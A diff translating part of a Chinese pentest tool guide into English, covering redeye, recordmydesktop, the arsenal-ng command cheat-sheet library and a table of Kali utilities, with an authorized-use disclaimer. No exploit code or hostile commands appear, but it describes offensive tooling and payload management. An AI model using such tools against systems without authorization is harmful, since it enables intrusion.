+**Practical tips**:
+- The old command `redeye` is deprecated; use `redeye-start` consistently.
+- The data model is organized around "campaign → hosts → credentials/attachments" and pairs smoothly with Cobalt Strike-style logs.
+- Listens on localhost only; use an SSH tunnel to forward 8443 for remote access.
 
-### recordmydesktop — 桌面录屏取证
+### recordmydesktop — Desktop screen recording for evidence
 
-**用途**:录制 Linux 桌面会话为 Ogg Theora 视频(可含 Vorbis 音频),只重编码变化区域故开销低。
-**安装**:`sudo apt install recordmydesktop`
-**使用场景**:漏洞复现录屏、PoC 演示、培训录像;作为渗透报告的证据链补充。
+**Purpose**: Records Linux desktop sessions as Ogg Theora video (optionally with Vorbis audio); only re-encodes changed regions, so overhead is low.
+**Installation**: `sudo apt install recordmydesktop`
+**When to use**: Vulnerability reproduction recordings, PoC demos, training videos; a supplement to the evidence chain in pentest reports.
 
 ```bash
 # 录制全屏(Ctrl+Mod1+p 暂停,Ctrl+Mod1+s 停止并保存)
@@ -385,16 +387,16 @@ recordmydesktop -o demo.ogv --fps 15 --on-the-fly-encoding --no-sound
 ffmpeg -i demo.ogv demo.mp4
 ```
 
-**实战要点**:
-- 默认快捷键 Mod1 即 Alt:Ctrl+Alt+p 暂停/恢复,Ctrl+Alt+s 停止。
-- 默认只捕获变化区域,快速全屏动画(视频播放、页面滚动)会糊,此时加 `--full-shots`。
-- ogv 格式多数客户环境不便播放,统一用 ffmpeg 转 mp4 后再入报告。
+**Practical tips**:
+- The default shortcut modifier Mod1 is Alt: Ctrl+Alt+p pauses/resumes, Ctrl+Alt+s stops.
+- By default only changed regions are captured; fast full-screen motion (video playback, page scrolling) will blur — add `--full-shots` in that case.
+- The ogv format is awkward to play in most client environments; convert to mp4 with ffmpeg before putting it into reports.
 
-### arsenal-ng — 渗透命令速查库(TUI)
+### arsenal-ng — Pentest command cheat sheet library (TUI)
 
-**用途**:内置 2800+ 条按工具组织的渗透命令模板(403bypasser、AD-miner 等 200+ 工具的 cheat sheet),终端内模糊搜索、变量替换、一键复制。
-**安装**:`sudo apt install arsenal-ng`
-**使用场景**:想不起某工具完整参数组合时,比翻 man 快;统一管理自己的常用 payload。
+**Purpose**: Ships with 2800+ pentest command templates organized by tool (cheat sheets for 200+ tools including 403bypasser, AD-miner); fuzzy search, variable substitution, and one-click copy in the terminal.
+**Installation**: `sudo apt install arsenal-ng`
+**When to use**: Faster than flipping through man pages when you cannot recall a tool's full parameter combination; also centralizes management of your frequently used payloads.
 
 ```bash
 # 启动 TUI,键入关键字过滤命令列表
@@ -405,22 +407,22 @@ arsenal-ng
 #           ↑/↓ 选择,回车复制到剪贴板,esc 退出
 ```
 
-**实战要点**:
-- 命令带标签(bypass/reconnaissance/active-directory 等),用标签词搜索更准。
-- 复制得到的命令仍需人工核对参数与目标值,再执行。
-- 本质是"记忆外挂",与 pipal/eyewitness 等无耦合,任何阶段都能用。
+**Practical tips**:
+- Commands are tagged (bypass/reconnaissance/active-directory, etc.); searching with tag terms is more accurate.
+- Copied commands still need manual verification of parameters and target values before execution.
+- Essentially a "memory extension"; decoupled from tools like pipal/eyewitness and usable at any stage.
 
-## 其余工具速查
+## Remaining Tools — Quick Reference
 
-| 工具 | 一句话用途 | 安装包 | 最常用命令 |
+| Tool | One-line purpose | Package | Most common command |
 |---|---|---|---|
-| obsidian | 本地优先的 Markdown 知识库笔记(插件生态) | obsidian | `obsidian` |
-| kali-tweaks | Kali 系统配置菜单(镜像源/代理/元包/加固选项) | kali-tweaks | `sudo kali-tweaks` |
-| gemini-cli | 终端内的 Gemini AI agent(交互/非交互) | gemini-cli | `gemini-cli -p "<prompt>"`(非交互模式) |
-| shell-gpt | LLM 生成 shell 命令与代码片段(需 OPENAI_API_KEY) | shell-gpt | `sgpt --shell "<用自然语言描述要执行的命令>"` |
-| portspoof | 反扫描伪装:65535 端口全开 + 动态假 banner 迷惑扫描器 | portspoof | `sudo portspoof-start` / `sudo portspoof-stop`(使用前需按其文档配置) |
-| faraday | 多用户渗透协作/编排平台 | faraday | `faraday`(同类备选:dradis / defectdojo / redeye) |
+| obsidian | Local-first Markdown knowledge base notes (plugin ecosystem) | obsidian | `obsidian` |
+| kali-tweaks | Kali system configuration menu (mirror/proxy/metapackage/hardening options) | kali-tweaks | `sudo kali-tweaks` |
+| gemini-cli | Gemini AI agent in the terminal (interactive/non-interactive) | gemini-cli | `gemini-cli -p "<prompt>"` (non-interactive mode) |
+| shell-gpt | LLM-generated shell commands and code snippets (requires OPENAI_API_KEY) | shell-gpt | `sgpt --shell "<describe the command to run in natural language>"` |
+| portspoof | Anti-scan camouflage: all 65535 ports open + dynamic fake banners to confuse scanners | portspoof | `sudo portspoof-start` / `sudo portspoof-stop` (configure per its documentation before use) |
+| faraday | Multi-user pentest collaboration/orchestration platform | faraday | `faraday` (similar alternatives: dradis / defectdojo / redeye) |
 
 ---
 
-仅用于已获书面授权的渗透测试、CTF 竞赛与安全教育场景。
+Use only for penetration testing with written authorization, CTF competitions, and security education scenarios.
